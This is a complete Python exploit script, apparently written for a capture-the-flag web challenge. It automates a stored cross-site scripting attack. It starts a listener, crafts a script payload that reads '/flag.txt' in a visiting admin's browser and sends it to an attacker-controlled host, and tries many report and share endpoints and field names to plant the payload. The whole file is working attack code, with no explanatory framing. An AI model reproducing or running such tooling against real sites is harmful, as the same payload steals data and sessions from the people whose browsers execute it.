#!/usr/bin/env python3
"""
auto_xss_exfil.py

Usage:
  python3 auto_xss_exfil.py

Default behavior (no args):
  - target: http://localhost:50001
  - listener: 0.0.0.0:9001
  - tries multiple endpoints and field names to post the payload
  - prints where a successful POST was made
  - prints the payload to copy if automatic posting fails

Notes:
  - This is a best-effort tool: many apps use different field names/URLs. The script
    tries common ones. If it can't find the exact endpoint, paste the printed payload
    into the app's "share" or "report" field manually.
  - For remote admin browsers, make sure the listener host/port are reachable by the admin browser.
"""

import argparse
import http.server
import socketserver
import threading
import urllib.parse
import time
import requests
import sys

# --------------- CONFIG -----------------
DEFAULT_TARGET = "http://localhost:50001"   # target webapp root
LISTEN_HOST = "0.0.0.0"                     # listener bind host
LISTEN_PORT = 9001                          # listener port for exfil
# ----------------------------------------

FLAG_EVENT = threading.Event()
RECEIVED_FLAG = None

class ReceiverHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global RECEIVED_FLAG
        parsed = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(parsed.query)
        if 'flag' in q:
            RECEIVED_FLAG = q['flag'][0]
            print("\n[+] Received flag via GET:", RECEIVED_FLAG)
            FLAG_EVENT.set()
        else:
            # For debug: if attacker POSTs to our GET endpoint (Image beacon with query)
            print("[*] GET req:", self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok\n")

    def do_POST(self):
        global RECEIVED_FLAG
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length > 0 else b''
        s = body.decode(errors='replace')
        RECEIVED_FLAG = s
        print("\n[+] Received flag via POST (body):", RECEIVED_FLAG)
        FLAG_EVENT.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"received\n")

    def log_message(self, fmt, *args):
        return

def run_listener(bind_host, bind_port):
    with socketserver.TCPServer((bind_host, bind_port), ReceiverHandler) as httpd:
        print(f"[+] Listener running on http://{bind_host}:{bind_port}")
        while not FLAG_EVENT.is_set():
            httpd.handle_request()
        print("[*] Listener shutting down")

def craft_payload(attacker_host, attacker_port, style="img"):
    # Use image beacon by default (best compatibility)
    host = attacker_host
    port = attacker_port
    if style == "img":
        payload = (
            "<script>"
            "fetch('/flag.txt').then(r=>r.text()).then(s=>{"
            "var i=new Image(); i.src='http://%s:%d/?flag='+encodeURIComponent(s);"
            "});"
            "</script>"
        ) % (host, port)
    else:
        # POST style:
        payload = (
            "<script>"
            "fetch('/flag.txt').then(r=>r.text()).then(s=>{"
            "fetch('http://%s:%d/',{method:'POST',body:encodeURIComponent(s)});"
            "});"
            "</script>"
        ) % (host, port)
    return payload

def attempt_post(session, target_root, payload):
    """
    Try a set of common endpoints and field names to store the payload.
    Returns (True, url, details) on success (HTTP 200/201) and where we posted.
    """
    endpoints = [
        "/report",
        "/reports",
        "/books/report",
        "/book/report",
        "/api/report",
        "/share",
        "/books/share",
        "/book/share",
        "/submit_report",
        "/report_book",
        "/report/submit",
    ]
    field_names = [
        "content", "comment", "description", "report", "reason", "link", "url", "title", "body", "text"
    ]

    headers = {"User-Agent": "exploit/1.0", "Referer": target_root}

    for ep in endpoints:
        url = urllib.parse.urljoin(target_root, ep)
        for field in field_names:
            data = {field: payload}
            try:
                r = session.post(url, data=data, headers=headers, timeout=3)
                if r.status_code in (200,201,202):
                    return True, url, {"field": field, "status": r.status_code}
            except requests.exceptions.RequestException:
                # ignore, try next
                pass

        # also try JSON
        for field in field_names:
            js = {field: payload}
            try:
                r = session.post(url, json=js, headers=headers, timeout=3)
                if r.status_code in (200,201,202):
                    return True, url, {"field": field, "status": r.status_code, "json": True}
            except requests.exceptions.RequestException:
                pass

    return False, None, None

def main():
    parser = argparse.ArgumentParser(description="Auto XSS exfil tool (best-effort)")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET, help="Target base URL (e.g. http://localhost:50001)")
    parser.add_argument("--listen-host", default=LISTEN_HOST, help="Listener bind host")
    parser.add_argument("--listen-port", type=int, default=LISTEN_PORT, help="Listener port")
    parser.add_argument("--att-host", default="localhost", help="Host used inside payload reachable by admin browser")
    parser.add_argument("--att-port", type=int, default=LISTEN_PORT, help="Port used inside payload reachable by admin browser")
    parser.add_argument("--style", choices=["img","post"], default="img", help="Payload beacon style (img=GET beacon/no-cors friendly)")
    parser.add_argument("--no-auto-post", action="store_true", help="Don't try automatic posting, only print payload")
    args = parser.parse_args()

    # start listener
    t = threading.Thread(target=run_listener, args=(args.listen_host, args.listen_port), daemon=True)
    t.start()
    time.sleep(0.2)

    payload = craft_payload(args.att_host, args.att_port, style=args.style)
    print("\n[+] Payload (paste into app's report/share field if auto-post fails):\n")
    print(payload)
    print("\n[*] Trying to auto-post payload to the target... (best-effort)")

    if args.no_auto_post:
        print("[*] Auto-post disabled. Wait for admin to visit the page and the listener will print the flag.")
        try:
            FLAG_EVENT.wait()
        except KeyboardInterrupt:
            print("Aborted")
        return

    session = requests.Session()
    posted, url, info = attempt_post(session, args.target, payload)
    if posted:
        print(f"[+] Successfully posted payload to: {url}")
        print("[+] POST details:", info)
        print("\n[*] Now wait for admin to visit the share/report link. Listener will print any incoming flag.")
    else:
        print("[-] Auto-post attempts failed. Please paste the payload into the webapp manually (report/share form).")
        print("    The script is listening; once admin visits the page the flag will be received at the listener address.")

    try:
        FLAG_EVENT.wait()
    except KeyboardInterrupt:
        print("User aborted, exiting.")
        sys.exit(1)

    print("[*] Done. Exiting.")

if __name__ == "__main__":
    main()
